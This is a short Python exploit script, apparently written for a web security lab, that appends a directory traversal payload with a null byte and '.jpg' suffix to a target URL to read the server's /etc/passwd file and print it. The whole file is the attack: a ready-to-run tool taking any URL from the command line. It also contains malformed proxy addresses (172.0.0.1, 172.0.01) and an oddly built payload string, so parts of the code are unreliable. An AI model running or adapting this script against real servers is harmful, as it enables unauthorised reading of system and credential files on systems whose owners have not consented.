import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://172.0.0.1:8080",
    "https": "http://172.0.01:8080"
}

def directory_traveral_exploit(url):
    image_url = url + './../../etc/passwd%0024.jpg'
    r = requests.get(image_url, verify=False)
    if 'root:x' in r.text:
        print(f"[+] Successfully retrieved the contents of /etc/passwd file:")
        print(r.text)
    else:
        print(f"[-] Failed to retrieve the contents of /etc/passwd file")
        sys.exit(1)
def main():
    # the use of the main function is to make suer the program runs correctly then if so exectutes the custom function to 
    # exploit the vulnerability
    if len(sys.argv) != 2:
        print (f"Usage: {sys.argv[0]} <url>")
        print (f"Example: {sys.argv[0]} http://example.com")
        sys.exit(1)

    url = sys.argv[1]
    print (f"[*] Exploiting the directory traversal vulnerability of URL: {url}")
    directory_traveral_exploit(url)

if __name__ == "__main__":
   main()